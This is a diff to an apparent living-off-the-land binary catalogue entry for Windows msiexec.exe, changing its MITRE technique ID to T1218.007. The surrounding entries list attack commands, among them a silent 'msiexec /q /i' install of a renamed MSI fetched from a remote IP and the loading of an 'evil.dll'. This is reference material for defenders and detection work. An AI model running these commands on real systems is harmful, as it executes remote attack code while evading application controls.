@@ -9,32 +9,28 @@ Commands:
     Usecase: Execute custom made msi file with attack code
     Category: Execute
     Privileges: User
-    MitreID: T1218
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1218
+    MitreID: T1218.007
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
   - Command: msiexec /q /i http://192.168.100.3/tmp/cmd.png
     Description: Installs the target remote & renamed .MSI file silently.
     Usecase: Execute custom made msi file with attack code from remote server
     Category: Execute
     Privileges: User
-    MitreID: T1218
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1218
+    MitreID: T1218.007
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
   - Command: msiexec /y "C:\folder\evil.dll"
     Description: Calls DLLRegisterServer to register the target DLL.
     Usecase: Execute dll files
     Category: Execute
     Privileges: User
-    MitreID: T1218
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1218
+    MitreID: T1218.007
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
   - Command: msiexec /z "C:\folder\evil.dll"
     Description: Calls DLLRegisterServer to un-register the target DLL.
     Usecase: Execute dll files
     Category: Execute
     Privileges: User
-    MitreID: T1218
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1218
+    MitreID: T1218.007
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
 Full_Path:
   - Path: C:\Windows\System32\msiexec.exe
